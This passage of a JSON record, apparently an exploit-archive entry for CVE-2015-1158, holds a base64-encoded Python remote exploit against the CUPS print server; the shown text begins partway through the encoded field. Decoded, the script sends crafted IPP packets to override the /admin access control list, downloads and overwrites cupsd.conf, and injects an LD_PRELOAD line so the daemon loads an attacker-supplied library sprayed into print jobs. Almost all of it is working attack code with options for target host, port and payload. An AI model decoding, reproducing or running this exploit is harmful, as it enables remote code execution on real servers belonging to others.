2IiAgICAgICMgICBud2wNCiAgICAgICAgICAgICAgICAiXHgwMFx4MDAiICAgICAgIyAgIG5hbWUgbGVuOiAwDQogICAgICAgICAgICAgICAgIlx4MDBceDE2IiAgICAgICMgICB2YWwgbGVuOiAyMg0KICAgICAgICAgICAgICAgICJceDAwXHgwNiIgICAgICAjICAgbGVuZ3RoDQogICAgICAgICAgICAgICAgIi9hZG1pbiINCiAgICAgICAgICAgICAgICAiXHgwMFx4MGMiDQogICAgICAgICAgICAgICAgIkJCQkJCQkJCQkJCQiINCiAgICAgICAgICAgICAgICAiXHgwMyIpICAgICAgIyAgIGVuZCBvZiBhdHRyaWJ1dGVzDQoNCiAgICBjb25mX3N0b21wID0gKCJceDAyXHgwMCIgICAgICAgICMgICB2ZXJzIDIuMA0KICAgICAgICAgICAgICAgICJceDAwXHgwNSIrICAgICAjICAgb3AgaWQ6IENyZWF0ZSBKb2IgKDB4MDAwNSkNCiAgICAgICAgICAgICAgICBzdHIocGFjaygiPmkiLChpKzIpKSkrDQogICAgICAgICAgICAgICAgIlx4MDEiICAgICAgIyAgIG9wIGF0dHJpYnV0ZXMgbWFya2VyDQogICAgICAgICAgICAgICAgIlx4NDciICAgICAgIyAgIGNoYXJzZXQNCiAgICAgICAgICAgICAgICAiXHgwMFx4MTIiICAgICAgIyAgIG5hbWUgbGVuOiAxOA0KICAgICAgICAgICAgICAgICJhdHRyaWJ1dGVzLWNoYXJzZXQiDQogICAgICAgICAgICAgICAgIlx4MDBceDA4IiAgICAgICMgICB2YWwgbGVuOiA4DQogICAgICAgICAgICAgICAgInVzLWFzY2lpIg0KICAgICAgICAgICAgICAgICJceDQ4IiAgICAgICMgICBuYXR1cmFsIGxhbmd1YWdlDQogICAgICAgICAgICAgICAgIlx4MDBceDFiIiAgICAgICMgICBuYW1lIGxlbjogMjcNCiAgICAgICAgICAgICAgICAiYXR0cmlidXRlcy1uYXR1cmFsLWxhbmd1YWdlIg0KICAgICAgICAgICAgICAgICJceDAwXHgwYiIgICAgICAjICAgdmFsIGxlbjogMTENCiAgICAgICAgICAgICAgICAiL2FkbWluL2NvbmYiDQogICAgICAgICAgICAgICAgIlx4NDUiICAgICAgIyAgIHByaW50ZXItdXJpDQogICAgICAgICAgICAgICAgIlx4MDBceDBiIiAgICAgICMgICBuYW1lIGxlbiAxMQ0KICAgICAgICAgICAgICAgICJwcmludGVyLXVyaSIgKw0KICAgICAgICAgICAgICAgIHN0cihwYWNrKCI+aCIsIGxlbihwcmludGVyX3VybCkpKSArIHByaW50ZXJfdXJsICsNCiAgICAgICAgICAgICAgICAiXHg0MiIgICAgICAjICAgbmFtZSB3aXRob3V0IGxhbmcNCiAgICAgICAgICAgICAgICAiXHgwMFx4MTQiICAgICAgIyAgIG5hbWUgbGVuOiAyMA0KICAgICAgICAgICAgICAgICJyZXF1ZXN0aW5nLXVzZXItbmFtZSINCiAgICAgICAgICAgICAgICAiXHgwMFx4MGIiICAgICAgIyAgIHZhbCBsZW46IDExDQogICAgICAgICAgICAgICAgIi9hZG1pbi9jb25mIg0KICAgICAgICAgICAgICAgICJceDAyIiAgICAgICMgICBqb2IgYXR0cnMgbWFya2VyDQogICAgICAgICAgICAgICAgIlx4MjEiICAgICAgIyAgIGludGVnZXINCiAgICAgICAgICAgICAgICAiXHgwMFx4MDYiICAgICAgIyAgIG5hbWUgbGVuOiA2DQogICAgICAgICAgICAgICAgImNvcGllcyINCiAgICAgICAgICAgICAgICAiXHgwMFx4MDQiICAgICAgIyAgIHZhbCBsZW46IDQNCiAgICAgICAgICAgICAgICAiXHgwMFx4MDBceDAwXHgwMSIgICMgICAxDQogICAgICAgICAgICAgICAgIlx4NDIiICAgICAgIyAgIG5hbWUgdy9vIGxhbmcNCiAgICAgICAgICAgICAgICAiXHgwMFx4MTkiICAgICAgIyAgIG5hbWUgbGVuOiAyNQ0KICAgICAgICAgICAgICAgICJqb2Itb3JpZ2luYXRpbmctaG9zdC1uYW1lIg0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDQyIiAgICAgICMgICBud29sDQogICAgICAgICAgICAgICAgIlx4MDBceDAwIiAgICAgICMgICBuYW1lIGxlbjogMA0KICAgICAgICAgICAgICAgICJceDAwXHgwYyIgICAgICAjICAgdmFsIGxlbjogMTINCiAgICAgICAgICAgICAgICAiQUFBQUFBQUFBQUFBIg0KICAgICAgICAgICAgICAgICJceDM2IiAgICAgICMgICBud2wNCiAgICAgICAgICAgICAgICAiXHgwMFx4MDAiICAgICAgIyAgIG5hbWUgbGVuOiAwDQogICAgICAgICAgICAgICAgIlx4MDBceDFiIiAgICAgICMgICB2YWwgbGVuOiAyNw0KICAgICAgICAgICAgICAgICJceDAwXHgwYiIgICAgICAjICAgbGVuZ3RoDQogICAgICAgICAgICAgICAgIi9hZG1pbi9jb25mIg0KICAgICAgICAgICAgICAgICJceDAwXHgwYyINCiAgICAgICAgICAgICAgICAiQkJCQkJCQkJCQkJCIg0KICAgICAgICAgICAgICAgICJceDAzIikgICAgICAjICAgZW5kIG9mIGF0dHJpYnV0ZXMNCg0KICAgIGh0dHBfaGVhZGVyMSA9ICgiUE9TVCAiICsgcHJpbnRlciArICIgSFRUUC8xLjFceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vaXBwXHgwZFx4MGEiDQogICAgICAgICAgICAgICAgICAgICJIb3N0OiAiICsgcmhvc3QgKyAiOiIgKyBycG9ydCArICJceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQ6IENVUFMvMi4wLjJceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgIkNvbm5lY3Rpb246IENsb3NlXHgwZFx4MGEiDQogICAgICAgICAgICAgICAgICAgICJDb250ZW50LUxlbmd0aDogIiArIHN0cihsZW4oYWRtaW5fc3RvbXApKSArICJceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgIlx4MGRceDBhIikNCg0KICAgIGh0dHBfaGVhZGVyMiA9ICgiUE9TVCAiICsgcHJpbnRlciArICIgSFRUUC8xLjFceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vaXBwXHgwZFx4MGEiDQogICAgICAgICAgICAgICAgICAgICJIb3N0OiAiICsgcmhvc3QgKyAiOiIgKyBycG9ydCArICJceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQ6IENVUFMvMi4wLjJceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgIkNvbm5lY3Rpb246IENsb3NlXHgwZFx4MGEiDQogICAgICAgICAgICAgICAgICAgICJDb250ZW50LUxlbmd0aDogIiArIHN0cihsZW4oY29uZl9zdG9tcCkpICsgIlx4MGRceDBhIg0KICAgICAgICAgICAgICAgICAgICAiXHgwZFx4MGEiKQ0KDQogICAgcHJldHR5KCIqIiwic3RvbXBpbmcgQUNMIikNCiAgICBwcmV0dHkoIioiLCI+OlxuIiArIGNyZWF0ZUR1bXAoaHR0cF9oZWFkZXIxICsgYWRtaW5fc3RvbXApKQ0KICAgIHByZXR0eSgiKiIsIjw6XG4iICsgY3JlYXRlRHVtcCh0eHJ4KHJob3N0LHJwb3J0LCJ0Y3AiLGh0dHBfaGVhZGVyMSArIGFkbWluX3N0b21wKSkpDQogICAgdGltZS5zbGVlcCgxKQ0KICAgIHByZXR0eSgiKiIsIj46XG4iICsgY3JlYXRlRHVtcChodHRwX2hlYWRlcjIgKyBjb25mX3N0b21wKSkNCiAgICBwcmV0dHkoIioiLCI8OlxuIiArIGNyZWF0ZUR1bXAodHhyeChyaG9zdCxycG9ydCwidGNwIixodHRwX2hlYWRlcjIgKyBjb25mX3N0b21wKSkpDQoNCiAgICBodHRwX2hlYWRlcl9jaGVjayA9ICgiR0VUIC9hZG1pbiBIVFRQLzEuMVx4MGRceDBhIg0KICAgICAgICAgICAgICAgICAgICAgICAgIkhvc3Q6ICIgKyByaG9zdCArICI6IiArIHJwb3J0ICsgIlx4MGRceDBhIg0KICAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQ6IENVUFMvMi4wLjJceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgICAgICJDb25uZWN0aW9uOiBDbG9zZVx4MGRceDBhIg0KICAgICAgICAgICAgICAgICAgICAgICAgIlx4MGRceDBhIikNCiAgICBwcmV0dHkoIioiLCJjaGVja2luZyAvYWRtaW4iKQ0KICAgIHByZXR0eSgiKiIsIj46XG4iICsgY3JlYXRlRHVtcChodHRwX2hlYWRlcl9jaGVjaykpDQogICAgcmVzID0gdHhyeChyaG9zdCxycG9ydCwidGNwIixodHRwX2hlYWRlcl9jaGVjaykNCiAgICBwcmV0dHkoIioiLCI8OlxuIiArIGNyZWF0ZUR1bXAocmVzKSkNCiAgICBtID0gcmUuc2VhcmNoKCcyMDAgT0snLCByZXMpDQogICAgaWYgbSBpcyBub3QgTm9uZToNCiAgICAgICAgcHJldHR5KCIrIiwiQUNMIHN0b21wIHN1Y2Nlc3NmdWwiKQ0KICAgIGVsc2U6DQogICAgICAgIHByZXR0eSgiLSIsImV4cGxvaXQgZmFpbGVkIikNCiAgICAgICAgZXhpdCgxKQ0KDQoNCmRlZiBnZXRDb25maWcocmhvc3QsIHJwb3J0KToNCiAgICBpID0gcmFuZG9tLnJhbmRpbnQoMSwxMDI0KQ0KICAgIG9yaWdpbmFsX2NvbmZpZyA9ICIiDQogICAgaHR0cF9yZXF1ZXN0ID0gKCJHRVQgL2FkbWluL2NvbmYvY3Vwc2QuY29uZiBIVFRQLzEuMVx4MGRceDBhIg0KICAgICAgICAgICAgICAgICAgICAiSG9zdDogIiArIHJob3N0ICsgIjoiICsgcnBvcnQgKyAiXHgwZFx4MGEiDQogICAgICAgICAgICAgICAgICAgICJVc2VyLUFnZW50OiBDVVBTLzIuMC4yXHgwZFx4MGEiDQogICAgICAgICAgICAgICAgICAgICJDb25uZWN0aW9uOiBDbG9zZVx4MGRceDBhIg0KICAgICAgICAgICAgICAgICAgICAiXHgwZFx4MGEiKQ0KDQogICAgcHJldHR5KCIqIiwiZ3JhYmJpbmcgY29uZmlndXJhdGlvbiBmaWxlLi4uLiIpDQogICAgcmVzID0gdHhyeChyaG9zdCxycG9ydCwidGNwIixodHRwX3JlcXVlc3QpDQogICAgcmVzX2FycmF5ID0gcmVzLnNwbGl0KCJceDBkXHgwYVx4MGRceDBhIikNCiAgICBvcmlnaW5hbF9jb25maWcgPSByZXNfYXJyYXlbMV0NCiAgICBwcmV0dHkoIioiLCJjb25maWc6XG4iICsgb3JpZ2luYWxfY29uZmlnICsgIlxuIikNCiAgICByZXR1cm4gb3JpZ2luYWxfY29uZmlnDQoNCmRlZiBwdXRDb25maWcocmhvc3QsIHJwb3J0LCBjb25maWcpOg0KICAgIGh0dHBfcmVxdWVzdCA9ICgiUFVUIC9hZG1pbi9jb25mL2N1cHNkLmNvbmYgSFRUUC8xLjFceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vaXBwXHgwZFx4MGEiDQogICAgICAgICAgICAgICAgICAgICJIb3N0OiAiICsgcmhvc3QgKyAiOiIgKyBycG9ydCArICJceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQ6IENVUFMvMi4wLjJceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgIkNvbm5lY3Rpb246IEtlZXAtQWxpdmVceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgIkNvbnRlbnQtTGVuZ3RoOiAiICsgc3RyKGxlbihjb25maWcpKSArICJceDBkXHgwYSINCiAgICAgICAgICAgICAgICAgICAgIlx4MGRceDBhIikNCiAgICBwcmV0dHkoIioiLCJvdmVyd3JpdGluZyBjb25maWcuLi4iKQ0KICAgIHByZXR0eSgiKiIsIj46XG4iICsgY3JlYXRlRHVtcChodHRwX3JlcXVlc3QgKyBjb25maWcpKQ0KICAgIHByZXR0eSgiKiIsIjw6XG4iICsgY3JlYXRlRHVtcCh0eHJ4KHJob3N0LHJwb3J0LCJ0Y3AiLGh0dHBfcmVxdWVzdCArIGNvbmZpZykpKQ0KDQpkZWYgcG9pc29uQ29uZmlnKGNvbmZpZywgbmFtZSk6DQogICAgY29uZmlnID0gY29uZmlnICsgIlx4MGFceDBhU2V0RW52IExEX1BSRUxPQUQgL3Zhci9zcG9vbC9jdXBzL2QwMCIgKyBuYW1lICsgIi0wMDFceDBhIg0KICAgIHJldHVybiBjb25maWcNCg0KZGVmIG1haW4oKToNCiAgICByaG9zdCA9IE5vbmU7DQogICAgbm9zaGVsbCA9IE5vbmU7DQogICAgb3B0aW9ucywgcmVtYWluZGVyID0gZ2V0b3B0LmdldG9wdChzeXMuYXJndlsxOl0sICdhOmI6YzpmOmg6JywgWydyaG9zdD0nLCdycG9ydD0nLCdsaWI9Jywnc3RvbXAtb25seScsJ2hlbHAnLF0pDQogICAgZm9yIG9wdCwgYXJnIGluIG9wdGlvbnM6DQogICAgICAgIGlmIG9wdCBpbiAoJy1oJywgJy0taGVscCcpOg0KICAgICAgICAgICAgdXNhZ2UoKQ0KICAgICAgICBlbGlmIG9wdCBpbiAoJy1hJywnLS1yaG9zdCcpOg0KICAgICAgICAgICAgcmhvc3QgPSBhcmc7DQogICAgICAgIGVsaWYgb3B0IGluICgnLWInLCctLXJwb3J0Jyk6DQogICAgICAgICAgICBycG9ydCA9IGFyZzsNCiAgICAgICAgZWxpZiBvcHQgaW4gKCctYycsJy0tbGliJyk6DQogICAgICAgICAgICBsaWJwYXRoID0gYXJnOw0KICAgICAgICBlbGlmIG9wdCBpbiAoJy1mJywnLS1zdG9tcC1vbmx5Jyk6DQogICAgICAgICAgICBub3NoZWxsID0gMTsNCiAgICBiYW5uZXIoKQ0KICAgIGlmIHJob3N0IGlzIE5vbmUgb3IgcnBvcnQgaXMgTm9uZToNCiAgICAgICAgdXNhZ2UoKQ0KICAgIHByZXR0eSgiKiIsImxvY2F0ZSBhdmFpbGFibGUgcHJpbnRlciIpDQogICAgcHJpbnRlciA9IGxvY2F0ZVByaW50ZXJzKHJob3N0LCBycG9ydCkNCiAgICBwcmV0dHkoIioiLCJzdG9tcCBBQ0wiKQ0KICAgIHN0b21wQUNMKHJob3N0LCBycG9ydCwgcHJpbnRlcikNCiAgICBpZiAobm9zaGVsbCBpcyBub3QgTm9uZSk6DQogICAgICAgIHByZXR0eSgiKiIsImZpbiIpDQogICAgICAgIGV4aXQoMCkNCiAgICBwcmV0dHkoIioiLCJwcmVwYXJlIHBheWxvYWQiKQ0KICAgIHBheWxvYWQgPSBwcmVwYXJlUGF5bG9hZChsaWJwYXRoKQ0KICAgIHByZXR0eSgiKiIsInNwcmF5IHBheWxvYWQiKQ0KICAgIGpvYmlkID0gc2VlZFRhcmdldChyaG9zdCwgcnBvcnQsIHByaW50ZXIsIHBheWxvYWQpDQogICAgcHJldHR5KCIqIiwiZ3JhYiBvcmlnaW5hbCBjb25maWciKQ0KICAgIE9HX2NvbmZpZyA9IGdldENvbmZpZyhyaG9zdCwgcnBvcnQpDQogICAgcHJldHR5KCIqIiwiZ2VuZXJhdGUgcG9pc29uIGNvbmZpZyIpDQogICAgZXZpbF9jb25maWcgPSBwb2lzb25Db25maWcoT0dfY29uZmlnLCBqb2JpZCkNCiAgICBwcmV0dHkoIioiLCJ1cGxvYWQgcG9pc29uIGNvbmZpZyIpDQogICAgcHV0Q29uZmlnKHJob3N0LCBycG9ydCwgZXZpbF9jb25maWcpDQogICAgcHJldHR5KCIqIiwiZmluIikNCiAgICBleGl0KDApOw0KDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIG1haW4oKQ==", 
    "filename": "platforms/linux/remote/41233.py", 
    "id": "41233", 
    "cves": [
        "CVE-2015-1158"
    ]
}